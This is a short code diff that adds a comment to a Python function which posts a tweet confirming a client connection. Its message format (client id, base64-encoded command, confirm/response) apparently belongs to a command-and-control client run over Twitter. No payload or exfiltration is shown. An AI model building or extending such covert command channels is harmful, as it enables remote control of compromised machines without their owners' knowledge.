@@ -21,6 +21,7 @@ api = tweepy.API(auth)
 def confirm_connection(api):
     # send tweet confirming connection
     # client_id::command_in_b64::confirm
+    # client_id::command_in_b64::response
     api.update_status(f'{client_id}::Client_Confirmed::confirm')
     return True
 
